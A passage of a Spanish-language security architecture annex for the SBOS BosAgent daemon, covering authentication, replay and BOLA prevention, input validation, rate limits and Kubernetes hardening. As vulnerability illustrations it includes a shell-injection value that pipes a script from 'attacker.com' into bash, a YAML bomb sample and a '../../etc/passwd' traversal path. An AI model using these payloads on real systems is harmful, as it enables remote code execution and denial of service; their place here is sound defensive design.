│              slow client · BOLA · hijacking de sesión                   │
│                                                                         │
│  SUP-2: TCP :9443 (HTTPS TLS 1.3)                                      │
│    callers: Kong readiness probe · Core UI                              │
│    NetworkPolicy: solo desde namespace sbos-edge                        │
│    amenazas: TLS bypass · DoS handshake flood · pod no autorizado       │
│                                                                         │
│  SUP-3: Kong Gateway :80/:443                                           │
│    callers: navegadores del tenant (UI web)                             │
│    amenazas: DDoS · credential stuffing · injection L7 · BOLA           │
│                                                                         │
│  SUP-4: JSON-RPC 2.0 inter-daemon (via Unix socket, P9)                │
│    callers: bAuth · bkernel · biedata · agentes IA                      │
│    amenazas: daemon comprometido suplanta identidad de otro             │
└─────────────────────────────────────────────────────────────────────────┘
```

### 5.2 Autenticación por invocación — no por conexión

El estándar IAM enterprise (Okta, Ping Identity, ForgeRock, IBM Security) exige verificar identidad en **cada operación**, no solo al abrir la conexión. Un atacante que hijackea una sesión WebSocket ya establecida no debe poder ejecutar ninguna operación.

```go
// Patrón obligatorio en CADA handler JSON-RPC
func (s *Server) rpcFichaInstall(req *RPCRequest) RPCResponse {
    // 1. Autenticación — ¿quién eres?
    if !s.validSharedToken(req.Token) {
        return errUnauthorized   // P4: fail-close
    }

    // 2. ctx_id obligatorio (P7 — SBOS-049)
    callerID, ts, err := s.ctx.ValidateCtxID(req.CtxID)
    if err != nil {
        return errInvalidCtx
    }

    // 3. Ventana temporal — no más de 60s desde creación del ctx_id
    if time.Since(ts) > 60*time.Second {
        return errCtxExpired
    }

    // 4. Autorización sobre el objeto (BOLA prevention — API1:2023)
    if !s.rbac.CallerOwns(ctx, callerID, "ficha", params.FichaID) {
        return errForbiddenObject
    }

    // 5. Solo aquí se ejecuta la lógica de dominio
    return s.ficha.Install(ctx, params)
}
```

### 5.3 Replay attack prevention (RFC 7519 §4.1.7 — JTI)

Un mensaje JSON-RPC capturado en el socket puede ser reenviado por un atacante.
Dos capas de defensa independientes:

**Capa 1 — ventana temporal del ctx_id (60 segundos):**

```go
// El ctx_id codifica created_at. Si llega tarde → rechazado.
if time.Since(ctx.CreatedAt) > 60*time.Second {
    return errReplay("ctx_id expirado")
}
```

**Capa 2 — JTI (JWT ID) para operaciones destructivas:**

Para `ficha.install`, `ficha.remove`, `tenant.create`, `tenant.remove` — irreversibles:

```go
// Check de unicidad de JTI — escrito en Redis con TTL
const jtiTTL = 10 * time.Minute  // 2× timeout máximo de una operación destructiva

jtiKey := "bos:jti:" + req.JTI
set, _ := s.redis.SetNX(ctx, jtiKey, "1", jtiTTL)
if !set {
    return errReplay("JTI ya visto — posible replay attack")
}
// Registrar en audit log con caller_id + timestamp
audit.Log(ctx, "jti_accepted", req.JTI, callerID)
```

### 5.4 BOLA — Broken Object Level Authorization (API1:2023 OWASP)

BOLA es el #1 del OWASP API Security Top 10. El 78.5% de los bug bounty reports confirmados en 2021-2026 son BOLA. En un IAM se manifiesta como: caller autenticado opera sobre un recurso que no le pertenece.

Ejemplos de BOLA en BOS:
- `biedata` daemon invoca `bos.tenant.remove` con `tenant_id` de otro tenant
- `bosctl` de usuario no-admin llama `bos.ficha.install` en servidor S00 (dataserver)
- Un agente IA llama `bos.portman.assign` para un servidor lógico que no gestiona

**Implementación — verificación en el data layer, no en el endpoint:**

```go
// rbac.CallerOwns — verifica en FileRBAC + BauthRBAC
func (r *RBAC) CallerOwns(ctx context.Context, callerID, resourceType, resourceID string) bool {
    // 1. FileRBAC: roles locales (bosctl admin siempre puede)
    if r.file.HasPermission(callerID, resourceType, resourceID) {
        return true
    }
    // 2. BauthRBAC: consulta bAuth daemon para permisos de tenant
    allowed, _ := r.bauth.CheckPermission(ctx, callerID, resourceType, resourceID)
    return allowed
}
```

La verificación ocurre **antes** de tocar el dominio. No hay rutas bypaseables.

### 5.5 Límites en el socket Unix — anti-bomb y anti-slow-client

OWASP API4:2023 (Unrestricted Resource Consumption): sin límites, un cliente malicioso puede agotar goroutines, RAM o descriptores de archivo del daemon.

```go
// internal/server/socket.go — límites duros en Accept loop
const (
    maxConcurrentConnections = 100
    maxMessageSizeBytes      = 1 * 1024 * 1024  // 1 MB
    idleTimeout              = 30 * time.Second
)

// El listener cuenta conexiones activas antes de aceptar
if atomic.LoadInt64(&s.activeConns) >= maxConcurrentConnections {
    conn.Close()   // rechaza sin leer — protege contra goroutine exhaustion
    return
}

// El reader limita tamaño antes de deserializar JSON
limited := &io.LimitedReader{R: conn, N: maxMessageSizeBytes + 1}
data, err := io.ReadAll(limited)
if limited.N <= 0 {
    conn.Close()   // message bomb — cerrar sin responder
    return
}

// Timeout idle — previene slow client / WebSocket slowloris
conn.SetDeadline(time.Now().Add(idleTimeout))
```

### 5.6 Kong Gateway — plugins de seguridad L7 activos

Kong 3.9 LTS activa estos plugins por route, derivados del `manifest.yml` de cada ficha vía `bos.fwman.policy.sync`. Sin configuración manual:

```yaml
# Generado por bos.fwman.policy.sync — no editar manualmente
plugins:
- name: injection-protection          # Kong 3.9: SQL, XSS, SSI, XPath, Java Exception
  config: { enforce_mode: block }

- name: request-validator             # JSON Schema del body — derivado del manifest
  config:
    body_schema: |
      {"type":"object","properties":{"ficha_id":{"type":"string","pattern":"^[a-z0-9][a-z0-9\\-_]{1,63}$"}}}

- name: json-threat-protection        # Previene JSON bomb
  config:
    max_array_element_count: 1000
    max_container_depth: 5
    max_object_entry_count: 100
    max_string_value_length: 65536

- name: rate-limiting
  config: { minute: 100, policy: local }   # por IP

- name: request-size-limiting
  config: { allowed_payload_size: 10 }     # MB

- name: bot-detection
  config: { deny: [] }                     # denylist default Kong

- name: ip-restriction
  config:
    deny: []                               # sincronizado con @crowdsec_blacklist cada hora
```

### 5.7 mTLS inter-daemon — identidad de workload con SPIFFE/SPIRE

Para SUP-4 (comunicación entre daemons vía Unix socket), las capas de autenticación son:

| Capa | Mecanismo | Cuándo |
|------|-----------|--------|
| SO | socket 0660, grupo `bosagent` | Siempre (ya activo) |
| Aplicación | shared token + ctx_id | Siempre (ya activo) |
| SPIFFE/SPIRE | SVID X.509 → mTLS + verificación de `spiffe://sbos.cluster/daemon/<id>` | Fase 2 CERTMAN |

El SPIFFE URI de cada daemon es inmutable y verificable: `spiffe://sbos.cluster/daemon/bos`,
`spiffe://sbos.cluster/daemon/bauth`, etc. Un daemon comprometido que no tenga el SVID correcto
es rechazado en la conexión, antes de que llegue al shared token.

---

## 6. Sanitización y Validación de Inputs

### 6.1 Por qué es la amenaza más alta en un IAM

Un IAM gestiona identidades y permisos de toda la infraestructura. Un input malicioso puede:
- **Path traversal** → leer el `manifest.yml` de keycloak y extraer sus secrets
- **Shell injection** → obtener root shell en el host desde un parámetro de ficha
- **YAML bomb** → crashear el parser → DoS del instalador
- **BOLA vía ID malformado** → acceder a fichas ajenas con un ID forjado

### 6.2 Mapa completo de vectores — BOS como target

| # | Input | Destino | Vector | OWASP | Severidad |
|---|-------|---------|--------|-------|:---------:|
| V1 | `ficha_id` | `servers/<server>/<ficha_id>/manifest.yml` | Path traversal | API1+API3 | CRÍTICA |
| V2 | `server` | `servers/<server>/` | Path traversal | API1 | CRÍTICA |
| V3 | Parámetros a `task_catalog.sh` | bash subprocess | Shell injection (OS Cmd) | API3 | CRÍTICA |
| V4 | `resources/*.yaml` via kubectl | kube-apiserver | YAML injection · priv esc | API3 | ALTA |
| V5 | `domain`, `tenant_name` | nginx conf · realm | Config injection | API3 | ALTA |
| V6 | `namespace` | kubectl namespace | Namespace escape | API1 | ALTA |
| V7 | Cuerpo de `manifest.yml` | Go YAML parser | YAML bomb (billion laughs) | API4 | MEDIA |
| V8 | `port` (int) | nftables · Kardex | Integer overflow | API3 | MEDIA |
| V9 | Queries al Kardex | PostgreSQL | SQL injection | API3 | BAJA ✅ |

### 6.3 V1 + V2 — Path traversal: solución Go 1.24

**El problema con `filepath.Clean()` en Go:**

```go
// filepath.Clean normaliza sintácticamente pero NO impide escapar del directorio base
filepath.Clean("../../etc/passwd")  // → "../../etc/passwd" — sigue siendo peligroso
filepath.Join(base, "../../etc/passwd")  // → "/etc/passwd" — escape exitoso
```

**Solución primaria — whitelist regex (nada que no coincida llega al filesystem):**

```go
// internal/server/validation.go
var (
    reFichaID   = regexp.MustCompile(`^[a-z0-9][a-z0-9\-_]{1,63}$`)
    reServer    = regexp.MustCompile(`^S(0[0-9]|1[0-7])$`)           // S00-S17, whitelist estricta
    reNamespace = regexp.MustCompile(`^[a-z0-9][a-z0-9\-]{0,62}$`)   // RFC 1123
    reDomain    = regexp.MustCompile(`^[a-z0-9][a-z0-9\-]{1,61}[a-z0-9](\.[a-z0-9][a-z0-9\-]{0,61}[a-z0-9])*$`)
)

func ValidateFichaParams(fichaID, server, ns string) error {
    if !reFichaID.MatchString(fichaID) {
        return fmt.Errorf("ficha_id inválido: %q (solo [a-z0-9-_], 2-64 chars)", fichaID)
    }
    if !reServer.MatchString(server) {
        return fmt.Errorf("servidor inválido: %q (esperado S00-S17)", server)
    }
    if ns != "" && !reNamespace.MatchString(ns) {
        return fmt.Errorf("namespace inválido: %q (RFC 1123)", ns)
    }
    return nil
}
```

**Solución secundaria — `os.Root` (Go 1.24), red de seguridad si la whitelist falla:**

```go
// os.Root confina TODAS las operaciones de archivo a un directorio base
// Rechaza "..", paths absolutos, y symlinks que escapen del root
fichasRoot, err := os.OpenRoot(paths.EtcBos + "/servers")
if err != nil {
    return err
}
defer fichasRoot.Close()

// Seguro: fichaID ya pasó la whitelist, pero os.Root es la red de seguridad
f, err := fichasRoot.Open(fichaID + "/manifest.yml")
if err != nil {
    return fmt.Errorf("ficha no encontrada: %w", err)
}
```

### 6.4 V3 — Shell injection: `exec.Command` con args separados

**Principio (OWASP + Snyk Go guide):** Nunca construir string de shell interpolando input.
El shell interpreta metacaracteres (`;`, `|`, `$()`, `` ` ``, `&`) antes de ejecutar.

```go
// INCORRECTO — cualquier fichaID puede inyectar comandos
cmd := exec.Command("sh", "-c", "task_catalog.sh "+fichaID+" install")
// fichaID = "; curl attacker.com/shell.sh | bash #"  → ejecución arbitraria

// CORRECTO — exec.Command sin shell, args como slice, input en env vars
cmd := exec.Command(filepath.Join(fichaPath, "task_catalog.sh"), "install")
cmd.Env = append(baseEnv(),
    "FICHA_ID="+fichaID,         // validado por reFichaID antes de llegar aquí
    "SERVER="+server,            // validado por reServer
    "NAMESPACE="+namespace,      // validado por reNamespace
    "CTX_ID="+ctxID,
)
cmd.Dir = fichaPath
```

En cada `task_catalog.sh` — **strict mode + double-quote es obligatorio:**

```bash
#!/bin/bash
set -euo pipefail       # exit on error, undefined var, pipe failure

# CORRECTO — variables entre comillas dobles siempre
apt-get install -y "${PACKAGE_NAME}"
kubectl apply -f "${MANIFEST_PATH}" --namespace="${NAMESPACE}"

# INCORRECTO — vulnerable a word splitting y globbing
apt-get install -y $PACKAGE_NAME
```

PortSwigger advierte explícitamente: *"Never try to sanitize input by escaping shell metacharacters"* — es bypasseable por atacantes expertos. La única defensa robusta es no invocar el shell.

### 6.5 V7 — YAML bomb: límite de tamaño + firma de release

Un YAML con anchors anidados puede expandirse exponencialmente:

```yaml
# 8 líneas → 100 millones de cadenas en RAM → OOM del parser
a: &a "aaaaaaaaaaaaaaaaaaaaaa"
b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
d:    [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
```

**Mitigación 1 — límite de tamaño antes del parse (defensa universal):**

```go
const maxManifestBytes = 512 * 1024  // 512 KB — ningún manifest legítimo es mayor

f, _ := os.Open(manifestPath)
limited := &io.LimitedReader{R: f, N: int64(maxManifestBytes) + 1}
data, _ := io.ReadAll(limited)
if limited.N <= 0 {
    return fmt.Errorf("manifest.yml supera %d KB — rechazado", maxManifestBytes/1024)
}
var manifest FichaManifest
if err := yaml.Unmarshal(data, &manifest); err != nil {
    return fmt.Errorf("manifest.yml inválido: %w", err)
}
```

**Mitigación 2 — firma Ed25519 del release plane (defensa primaria en producción):**

Los manifests vienen del SKULL Release Server con firma Ed25519. La verificación ocurre antes del parse — un manifest sin firma válida se descarta antes de tocar el parser.

### 6.6 V9 — SQL injection: ya mitigado en todo el codebase

`PgKardex` en `internal/portman/kardex.go` usa placeholders `$1, $2, ...` en todas las queries. No existe `fmt.Sprintf` en ninguna query. Este patrón es **obligatorio en todo nuevo código** que acceda a PostgreSQL:

```go
// CORRECTO — siempre (ya implementado en PgKardex)
const q = `SELECT port, service_name FROM bos.prt_port_assignment
           WHERE ficha_id = $1 AND status = $2`
rows, err := db.QueryContext(ctx, q, fichaID, "assigned")

// INCORRECTO — prohibido por convención de codebase
q := fmt.Sprintf("SELECT ... WHERE ficha_id = '%s'", fichaID)
```

### 6.7 Flujo de validación obligatorio — 6 pasos en todo handler

```
Handler JSON-RPC recibe req
  │
  ├─[1] Autenticación      validSharedToken(req.Token) → err → HTTP 401
  │
  ├─[2] Autorización BOLA  rbac.CallerOwns(callerID, resource, id) → err → HTTP 403
  │
  ├─[3] Replay check       ctx_id timestamp < 60s + jti SetNX → err → HTTP 409
  │       (solo ops destructivas: install, remove, tenant.create, tenant.remove)
  │
  ├─[4] Validación whitelist  ValidateFichaParams(fichaID, server, ns) → err → HTTP 400
  │       (todo string que llegue a filesystem, shell o K8s)
  │
  ├─[5] Size check         len(blob) ≤ maxManifestBytes → err → HTTP 413
  │       (solo cuando el body incluye contenido inline: manifests, configs)
  │
  └─[6] Lógica de dominio  s.domain.DoOperation(ctx, params)
```

Un handler que salte cualquier paso de 1-5 es una **vulnerabilidad confirmada** que el Revisor debe rechazar.

---

## 7. Protección de Recursos y Anti-Abuso

### 7.1 OWASP API4:2023 — Unrestricted Resource Consumption

Para un IAM enterprise, el agotamiento de recursos es tan devastador como un breach de datos: el instalador queda inaccesible y el despliegue de toda la infraestructura se detiene.

BOS aplica límites en 5 capas independientes:

```
Capa 1 — Socket Unix         : conexiones, tamaño mensaje, timeouts, rate por UID
Capa 2 — Respuestas          : paginación obligatoria, max 500 rows
Capa 3 — Base de datos       : connection pool (ya en PgKardex: 4 open, 2 idle)
Capa 4 — K8s API             : circuit breaker — 3 fallos → OPEN 30s
Capa 5 — Pods K8s            : ResourceQuota + LimitRange por namespace
```

### 7.2 Rate limiting por UID del proceso (Unix socket)

El socket Unix permite identificar al caller por UID del proceso (syscall `SO_PEERCRED`).
Este mecanismo es más robusto que IP-based: el UID no se puede spoofear desde el mismo host.

```go
// Obtener UID del peer — Linux (go 1.21+)
func peerUID(conn net.Conn) (uint32, error) {
    uc, ok := conn.(*net.UnixConn)
    if !ok {
        return 0, fmt.Errorf("no es UnixConn")
    }
    raw, _ := uc.SyscallConn()
    var cred *syscall.Ucred
    raw.Control(func(fd uintptr) {
        cred, _ = syscall.GetsockoptUcred(int(fd), syscall.SOL_SOCKET, syscall.SO_PEERCRED)
    })
    if cred == nil {
        return 0, fmt.Errorf("SO_PEERCRED no disponible")
    }
    return cred.Uid, nil
}
```

Límites diferenciados por categoría de operación y UID:

| Categoría | Métodos | Límite por UID/min | Por qué |
|-----------|---------|:-----------------:|---------|
| Destructivo | ficha.install/remove · tenant.create/remove | 10 | Operaciones irreversibles |
| Mutación | portman.assign · certman.issue · fwman.sync | 60 | I/O DB + K8s |
| Consulta | status · list · lookup · check · export | ∞ | Read-only, sin side effects |

Implementación: sliding window con `sync.Map[uid → []time.Time]`. Sin Redis externo — el estado vive en memoria del proceso BOS.

### 7.3 Timeouts por categoría de método

```go
// internal/server/timeouts.go
var methodTimeouts = map[string]time.Duration{
    // Consulta inmediata (DB read + state.Manager)
    "bos.ficha.status":         5 * time.Second,
    "bos.ficha.list":           5 * time.Second,
    "bos.portman.lookup":       5 * time.Second,
    "bos.portman.list":         5 * time.Second,
    "bos.portman.check":        5 * time.Second,
    "bos.certman.list":         5 * time.Second,
    "bos.ips.status":           5 * time.Second,

    // Operación estándar (DB write + K8s API call)
    "bos.portman.assign":       30 * time.Second,
    "bos.certman.issue":        30 * time.Second,
    "bos.fwman.policy.sync":    30 * time.Second,
    "bos.portman.validate":     30 * time.Second,

    // Ciclo de vida de fichas (pull imagen + startup K8s)
    "bos.ficha.install":        300 * time.Second,
    "bos.ficha.repair":         300 * time.Second,
    "bos.ficha.remove":         120 * time.Second,
    "bos.ficha.scale":          60 * time.Second,

    // Bootstrap día 0 (kubeadm + stack completo)
    "bos.bootstrap.start":      3600 * time.Second,
}

// Uso en dispatcher
func (s *Server) dispatch(req *RPCRequest) RPCResponse {
    timeout, ok := methodTimeouts[req.Method]
    if !ok {
        timeout = 30 * time.Second  // default seguro
    }
    ctx, cancel := context.WithTimeout(req.Context, timeout)
    defer cancel()
    return s.registry[req.Method](ctx, req)
}
```

### 7.4 Paginación obligatoria — sin listas ilimitadas

Ningún método de listado retorna resultados sin límite (protege contra escaneo de tabla completa):

```go
const (
    defaultPageSize = 100
    maxPageSize     = 500  // nunca más de 500 rows en una sola respuesta
)

func parseListParams(raw map[string]interface{}) (limit, offset int) {
    limit = defaultPageSize
    if v, ok := raw["limit"].(float64); ok {
        limit = min(int(v), maxPageSize)
    }
    if v, ok := raw["offset"].(float64); ok {
        offset = max(0, int(v))
    }
    return
}
```

### 7.5 Circuit breaker para K8s API

Si el kube-apiserver no responde, BOS no puede bloquear indefinidamente goroutines esperando kubectl:

```
Estado CLOSED
  │ llamadas normales
  │ fallo HTTP 5xx / timeout → contador++
  │ 3 fallos consecutivos
  ▼
Estado OPEN (30 segundos)
  │ bos.ficha.status → cached state de state.Manager (P8)
  │ bos.ficha.install → error JSON-RPC -32001 "K8s API no disponible"
  │ bos.portman.validate → error JSON-RPC -32001
  │ 30 segundos transcurridos
  ▼
Estado HALF-OPEN
  │ 1 llamada de prueba a kube-apiserver
  │ éxito → CLOSED
  └ fallo → OPEN (reinicia timer)

Implementación: atomic.Int32 para estado + time.Time para timer
Todo en k8s.Core (Principio P1) — no en cada operación individual
```

### 7.6 K8s ResourceQuota y LimitRange — generados automáticamente

`bos.fwman.policy.sync` aplica estos objetos en cada namespace SBOS al instalar la primera ficha.
Previene pod runaway, OOM cascada, y DDoS interno entre fichas:

```yaml
# Generado por bos.fwman.policy.sync — fuente de verdad: config NetMan
apiVersion: v1
kind: ResourceQuota
metadata:
  name: sbos-quota
  namespace: sbos-<zona>         # sbos-identity, sbos-data, sbos-apps, etc.
spec:
  hard:
    requests.cpu: "4"
    requests.memory: "8Gi"
    limits.cpu: "8"
    limits.memory: "16Gi"
    pods: "50"
    services: "20"
    persistentvolumeclaims: "10"
---
apiVersion: v1
kind: LimitRange
metadata:
  name: sbos-limits
  namespace: sbos-<zona>
spec:
  limits:
  - type: Container
    default:        { cpu: "500m",  memory: "512Mi" }
    defaultRequest: { cpu: "100m",  memory: "128Mi" }
    max:            { cpu: "4",     memory: "4Gi"   }
    min:            { cpu: "10m",   memory: "32Mi"  }
```

### 7.7 PodSecurityStandard: restricted en todos los namespaces SBOS

```yaml
# Label en cada namespace SBOS — aplicado por bos.fwman.policy.sync
apiVersion: v1
kind: Namespace
metadata:
  name: sbos-<zona>
  labels:
    pod-security.kubernetes.io/enforce: restricted   # K8s PSA GA desde v1.25
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

Restricciones que impone `restricted`:
- `runAsNonRoot: true` — sin root en containers
- `allowPrivilegeEscalation: false`
- `seccompProfile: RuntimeDefault`
- `capabilities: drop: ["ALL"]`
- Sin `hostNetwork`, `hostPID`, `hostIPC`
- Sin `hostPath` volumes no declarados en manifest

Un pod que viola cualquier restricción es rechazado por el API server antes de scheduling.

### 7.8 Diagrama de defensa completa

```
[Internet] ──► nftables SYNPROXY + CrowdSec @blacklist
                 SYN flood, UDP flood, IPs maliciosas → DROP kernel (nanosegundos)

[Pasa L3/L4] ──► Kong Gateway :443
                  rate-limiting 100/min/IP, injection-protection, json-threat-protection
                  bot-detection, request-size-limiting 10MB → HTTP 429 / 400

[Pasa Kong] ──► TCP :9443 (NetworkPolicy: solo sbos-edge)
                 TLS 1.3 (Vault PKI), solo pods en sbos-edge pueden conectar

[Compromiso interno] ──► /run/bos/bos.sock
                          permisos SO 0660/bosagent → sin grupo, sin acceso
                          autenticación por invocación (ctx_id + token) → P4 fail-close
                          replay prevention (ts 60s + jti SetNX) → mensaje robado inútil
                          BOLA prevention (callerOwns) → no puede operar recursos ajenos
                          rate limit por UID SO (SO_PEERCRED) → 10 destroy/min máximo
                          message size 1MB → JSON bomb rechazado antes de parse
                          idle timeout 30s → slow client expulsado

[Parámetro malicioso en RPC] ──► Validación de inputs
                                  whitelist regex (fichaID, server, ns, domain) → reject
                                  os.Root (Go 1.24) → path traversal imposible
                                  exec.Command args separados → shell injection imposible
                                  límite 512KB + firma Ed25519 → YAML bomb imposible
                                  $1 $2 placeholders → SQL injection imposible

[Pod comprometido] ──► NetworkPolicy deny-all
                        no puede contactar otros pods sin allow explícito
                        SPIFFE/SPIRE SVID → sin identidad válida, daemon rechaza
                        ResourceQuota + LimitRange → no puede agotar recursos del nodo
                        PodSecurityStandard restricted → sin escalada de privilegios
```

---

## 8. Flujo integrado: instalar una ficha = seguridad automática

```
bosctl ficha install postgresql

  bos.ficha.install (daemon)
    │
    ├─[1] DEPENDENCY_RESOLVER: verificar dependencias OK
    │
    ├─[2] PORT MANAGER: bos.portman.assign
    │       • Derivar puerto S00 + index 0 + tipo_t 0 = 20000
    │       • Verificar 3 capas → LIBRE
    │       • Registrar T-408: postgresql:K8S_CLUSTER_IP:20000
    │       • Retornar: port=20000, service_name="sbos-postgresql-data"
    │
    ├─[3] CERT MANAGER: bos.certman.issue
    │       • Emitir cert via cert-manager + Vault PKI
    │       • SAN: postgresql.sbos-data.svc.cluster.local
    │       • Guardar en Secret: postgresql-tls-secret
    │       • Registrar T-413: cert válido 90 días, auto-renew ON
    │
    ├─[4] FIREWALL MANAGER: bos.fwman.policy.sync
    │       • Leer Kardex T-408 para ficha postgresql
    │       • Generar NetworkPolicy: deny-all base en sbos-data
    │       • Generar NetworkPolicy: allow ingress port 20000 from sbos-apps
    │       • kubectl apply NetworkPolicies
    │
    ├─[5] K8S CORE: kubectl apply -f
    │       • Service YAML (ClusterIP:20000)
    │       • Deployment YAML
    │       • Secret postgresql-tls-secret
    │
    └─[6] HEALTH CHECK: TCP probe 20000 → OK ✅

RESULTADO: postgresql instalada, puerto asignado, certificado emitido,
           NetworkPolicy activa. El operador no configuró nada.
```

---

## 9. DDL — Tablas implementadas (grupo NET)

Las dos tablas del grupo NET están en `DDLs/bos_01__control_plane.sql` (commit `3fc8a9e`).
El DDL canónico es la fuente de verdad; este anexo documenta el diseño y el razonamiento.

| Código | Tabla | DDL completo |
|--------|-------|-------------|
| T-413  | `bos.net_cert_inventory` | ver §2.7 de este anexo |
| T-414  | `bos.net_security_events` | particionada por RANGE(event_time), 27 event_types, `src_ip INET` |

**Diferencias del DDL real vs el diseño inicial de este anexo:**

| Campo / Decisión | Diseño inicial | DDL canónico | Motivo |
|-----------------|---------------|--------------|--------|
| Nombre T-413 | `bos.cert_inventory` | `bos.net_cert_inventory` | Convención grupo NET (`net_*`) |
| UNIQUE T-413 | `(subject_cn, namespace, cert_type)` | `fingerprint_sha256` | Huella = identidad real del cert; un mismo CN puede tener varios certs válidos simultáneos |
| `src_ip` T-414 | `TEXT` | `INET` | Tipo nativo PG — soporta búsquedas por red (`inet '10.0.0.0/8'`) |
| T-414 particionado | No | Sí — RANGE(event_time) mensual | Retención 90 días sin lock de tabla completa |

---

## 10. Validación con normas internacionales

| Norma | Requerimiento | Motor que lo cumple |
|-------|-------------|---------------------|
| **NIST SP 800-207 (ZTA)** | mTLS en toda comunicación, mínimo privilegio, verificación continua | CERTMAN (SPIFFE/SPIRE mTLS) + FWMAN (deny-all + allows mínimos) |
| **NIST SP 800-41** | Documentación de cada regla, stateful inspection, logging de rechazos | FWMAN (nftables stateful) + IPS (logging estructurado) |
| **NIST SP 800-53 CM-8(3)** | Detección de componentes no autorizados | PORTMAN validate (puertos sin Kardex) + FWMAN audit (reglas no canónicas) |
| **ISO 27001:2022 A.8.20** | Inventario actualizado de activos de red | Kardex T-408 (puertos) + T-413 (certs) |
| **ISO 27001:2022 A.8.21** | Seguridad de servicios de red, identificación de mecanismos | FWMAN (NetworkPolicy por ficha) + CERTMAN (TLS por servicio) |
| **ISO 27001:2022 A.8.24** | Criptografía: inventario de claves y certificados | Kardex T-413 (tipo, algoritmo, expiración, responsable) |
| **CIS K8s Benchmark v1.10 §5.3** | NetworkPolicy en todos los namespaces, deny-all base | FWMAN policy.sync genera deny-all automáticamente |
| **RFC 6335 (BCP 165)** | Registro formal de puertos con 8 campos obligatorios | PORTMAN (implementa RFC 6335 para el cluster SBOS) |
| **RFC 8555 (ACME)** | Emisión automática de certificados | CERTMAN (acme.sh + cert-manager integrado) |

---

## 11. Estructura de código — roadmap de implementación

```
BosAgent/src/internal/
├── portman/           ← ✅ IMPLEMENTADO (commit 380cd69)
│   ├── portman.go     ← doc del paquete
│   ├── blacklist.go   ← capas 1 y 2
│   ├── engine.go      ← algoritmos A y B
│   ├── kardex.go      ← CRUD T-408
│   ├── manager.go     ← punto de entrada público
│   └── portman_test.go← 6 tests OK
│
├── certman/           ← 🔴 POR IMPLEMENTAR — Fase 2
│   ├── certman.go     ← doc + Manager
│   ├── vault.go       ← emisión/revocación via Vault PKI
│   ├── certmanager.go ← integración cert-manager K8s CRDs
│   ├── spire.go       ← consulta de SVIDs SPIFFE
│   ├── acme.go        ← certs externos vía ACME
│   ├── kardex.go      ← CRUD T-413
│   ├── watcher.go     ← goroutine que detecta certs próximos a expirar
│   └── certman_test.go
│
├── fwman/             ← 🔴 POR IMPLEMENTAR — Fase 3
│   ├── fwman.go       ← doc + Manager
│   ├── nftables.go    ← gestión de ruleset nftables (via exec nft)
│   ├── netpol.go      ← generador de NetworkPolicy K8s desde Kardex T-408
│   ├── zones.go       ← definición de zonas de seguridad SBOS
│   ├── whitelist.go   ← admin_whitelist dinámica
│   ├── audit.go       ← comparar ruleset actual vs canónico
│   └── fwman_test.go
│
└── ips/               ← 🔴 POR IMPLEMENTAR — Fase 4
    ├── ips.go         ← doc + Manager
    ├── crowdsec.go    ← integración CrowdSec LAPI
    ├── fail2ban.go    ← control de fail2ban via systemd/CLI
    ├── psad.go        ← lectura de alertas psad
    └── ips_test.go
```

**Fases de implementación:**

| Fase | Motor | Prioridad | Esfuerzo |
|------|-------|-----------|---------|
| **Fase 1** | portman | ✅ DONE | — |
| **Fase 2** | certman | Alta — sin certs válidos los servicios fallan | 3-4 días |
| **Fase 3** | fwman (NetworkPolicy) | Alta — microsegmentación es obligatoria | 2-3 días |
| **Fase 3b** | fwman (nftables host) | Media — el host ya tiene nftables del SO | 1-2 días |
| **Fase 4** | ips | Media — CrowdSec/fail2ban se instalan como fichas | 1 día |

---

## 12. Métodos JSON-RPC completos del NetMan

```
bos.portman.assign   bos.portman.lookup   bos.portman.release
bos.portman.check    bos.portman.list     bos.portman.validate  bos.portman.export

bos.certman.issue    bos.certman.revoke   bos.certman.renew
bos.certman.status   bos.certman.list     bos.certman.watch
bos.certman.rotate_ca bos.certman.export

bos.fwman.policy.sync    bos.fwman.policy.status
bos.fwman.host.status    bos.fwman.host.validate   bos.fwman.host.reload
bos.fwman.whitelist.add  bos.fwman.whitelist.remove bos.fwman.audit

bos.ips.status  bos.ips.blacklist.list  bos.ips.blacklist.unblock  bos.ips.alerts
```

---

## 13. Experiencias de industria que validan este diseño

| Organización / Herramienta | Patrón adoptado por SBOS |
|---------------------------|--------------------------|
| **cert-manager** (CNCF Graduated, >85% K8s deployments) | Emisor de certs para fichas K8s con Vault como backend |
| **HashiCorp Vault PKI** (estándar empresarial de PKI en K8s) | CA interna + renovación automática para daemons host |
| **SPIFFE/SPIRE** (CNCF Graduated, Google, Netflix, Uber) | Identidad de workload para mTLS sin configuración por pod |
| **CrowdSec** (IPS comunitario moderno, >10K despliegues 2025) | IPS behavioural + blocklist global + bouncer nftables |
| **Calico nftables dataplane** (GA v3.31, Microsoft AKS, IBM) | CNI + NetworkPolicy + firewall K8s unificados |
| **WireGuard** (Linux kernel 5.6+, estándar VPN 2025) | Acceso administrativo soberano sin VPN propietaria |
| **NetBox** (estándar de inventario de red Fortune 500) | Kardex T-408+T-413 como fuente de verdad de activos de red |
| **Kong Gateway** (implementa K8s Gateway API, sucesor de ingress-nginx deprecado 2026) | Único punto de entrada externo con TLS termination y plugins |

---

*SKULL · SBOS · BosAgent · Julio 2026*
